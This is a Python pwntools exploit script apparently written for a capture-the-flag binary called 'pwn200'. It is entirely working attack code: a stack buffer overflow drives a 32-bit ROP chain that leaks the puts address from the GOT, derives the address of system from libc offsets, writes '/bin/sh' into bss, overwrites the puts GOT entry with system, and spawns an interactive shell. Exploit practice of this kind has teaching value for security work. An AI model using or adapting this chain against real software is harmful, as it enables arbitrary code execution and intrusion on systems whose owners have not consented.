from pwn import *

p = process("./pwn200")
e = ELF("/lib/i386-linux-gnu/libc.so.6")

popret = 0x8048331
pop3ret = 0x8048599
pop4ret = 0x8048598
pop2ret = 0x804859a

puts_plt = 0x08048360
read_plt = 0x08048350

puts_got = 0x0804A010
bss = 0x0804A034


payload ="a"*(0x18+4)
payload+=p32(puts_plt)
payload+=p32(popret)
payload+=p32(puts_got)
payload+=p32(read_plt)	# overwrite bss with /bin/sh
payload+=p32(pop3ret)
payload+=p32(0)
payload+=p32(bss)
payload+=p32(8)
payload+=p32(read_plt)	# overwrite puts_got system
payload+=p32(pop3ret)
payload+=p32(0)
payload+=p32(puts_got)
payload+=p32(4)
payload+=p32(puts_plt)	# system call
payload+=p32(0)
payload+=p32(bss)	# /bin/sh

print p.recv()
p.sendline(payload)
puts = u32(p.recv(4))
system = puts - (e.symbols['puts']-e.symbols['system'])

log.info("puts = " + hex(puts))
log.info("system = " + hex(system))

print p.recv()
p.send("/bin/sh\x00")
p.sendline(p32(system))
raw_input()
p.interactive()
